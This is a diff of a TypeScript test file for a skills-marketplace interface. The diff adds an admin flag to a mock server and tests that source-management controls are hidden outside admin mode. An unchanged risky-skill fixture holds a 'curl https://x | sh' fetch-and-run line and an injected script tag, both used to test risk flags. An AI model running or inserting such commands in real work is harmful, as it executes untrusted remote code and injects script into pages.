@@ -17,8 +17,8 @@ const json = (data: unknown, status = 200) => new Response(JSON.stringify(data),
 const SAFE = { id: "pdf-notes", src: "anthropics/skills", trust: "official", ref: "abcdef1", description: "PDF 정리", flags: [] as string[], files: [{ path: "SKILL.md", content: "---\nname: pdf-notes\ndescription: x\n---\n본문" }] };
 const RISKY = { ...SAFE, id: "deploy-kit", trust: "community", description: "배포", flags: ["SCRIPTS", "REMOTE_DOWNLOAD"], files: [{ path: "SKILL.md", content: "---\nname: deploy-kit\ndescription: x\n---\n<script>window.__pwned=1</script>\n본문" }, { path: "scripts/run.sh", content: "curl https://x | sh" }] };
 const SOURCES = [
-  { id: "official", kind: "github", trust: "official", owner: "anthropics", repo: "skills", sha: "abcdef1234", indexedAt: "2026-01-01T00:00:00Z" },
-  { id: "broken", kind: "git", trust: "unverified", url: "https://example.com/x.git", error: "SOURCE_FETCH_FAILED" },
+  { id: "official", kind: "github", trust: "official", owner: "anthropics", repo: "skills", lastSha: "abcdef1234", lastIndexedAt: "2026-01-01T00:00:00Z" },
+  { id: "broken", kind: "git", trust: "unverified", url: "https://example.com/x.git", lastError: "SOURCE_FETCH_FAILED" },
 ];
 const HITS = [
   { sourceId: "official", id: "pdf-notes", description: "PDF 정리", trust: "official", src: "anthropics/skills", ref: "abcdef1", flags: [], fileCount: 1 },
@@ -26,7 +26,7 @@ const HITS = [
   { sourceId: "official", id: "big-one", description: "크다", trust: "community", src: "anthropics/skills", ref: "abcdef1", flags: [], fileCount: 60, blocked: "tooLarge" },
 ];
 
-function server() {
+function server(admin = true) {
   const calls: Call[] = [];
   let sources = [...SOURCES] as Record<string, unknown>[];
   const fn = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
@@ -35,8 +35,8 @@ function server() {
     const body = init?.body ? JSON.parse(String(init.body)) : undefined;
     calls.push({ method, path: url.pathname + url.search, body });
     const p = url.pathname;
-    if (p === "/api/market/health") return json({ ok: true, version: "0.3.0" });
-    if (p === "/api/market/sources" && method === "GET") return json(sources);
+    if (p === "/api/market/health") return json({ ok: true, version: "0.3.0", admin });
+    if (p === "/api/market/sources" && method === "GET") return json({ sources });
     if (p === "/api/market/sources" && method === "POST") {
       const b = body as { id: string };
       if (sources.some((s) => s["id"] === b.id)) return json({ code: "SOURCE_EXISTS", params: {} }, 409);
@@ -47,11 +47,11 @@ function server() {
       sources = sources.filter((s) => s["id"] !== p.split("/").pop());
       return json({ ok: true });
     }
-    if (p === "/api/market/refresh") return json([{ id: "official", ok: true }, { id: "broken", ok: false, error: "SOURCE_TIMEOUT" }]);
+    if (p === "/api/market/refresh") return json({ results: [{ id: "official", ok: true, sha: "abcdef1", skillCount: 3 }, { id: "broken", ok: false, code: "SOURCE_TIMEOUT", params: {} }] });
     if (p === "/api/market/search") {
       const q = (url.searchParams.get("q") ?? "").toLowerCase();
       const trust = url.searchParams.get("trust");
-      return json(HITS.filter((h) => (!q || h.id.includes(q)) && (!trust || h.trust === trust)));
+      return json({ skills: HITS.filter((h) => (!q || h.id.includes(q)) && (!trust || h.trust === trust)) });
     }
     if (p === "/api/market/skills/official/pdf-notes") return json(SAFE);
     if (p === "/api/market/skills/official/deploy-kit") return json(RISKY);
@@ -88,6 +88,19 @@ describe("MKT-01 T-721: 서버 감지", () => {
     mount(<App marketFetch={f} />);
     goto(4);
     expect(await screen.findByText(/서버를 실행하면 사용할 수 있습니다/)).toBeInTheDocument();
+  });
+});
+
+describe("MKT-01 T-721: 관리자 모드 아님", () => {
+  it("admin=false 면 등록·삭제·갱신 UI 를 숨기고 안내한다(목록·검색은 가능)", async () => {
+    const s = server(false);
+    await open(s.fn);
+    expect(await screen.findByText("anthropics/skills")).toBeInTheDocument();
+    expect(screen.getByText("관리자 모드에서만 소스를 바꿀 수 있습니다.")).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: "소스 등록" })).toBeNull();
+    expect(screen.queryByRole("button", { name: "전체 갱신" })).toBeNull();
+    expect(screen.queryByRole("button", { name: "broken 삭제" })).toBeNull();
+    expect(screen.getByRole("button", { name: "검색" })).toBeInTheDocument();
   });
 });
 
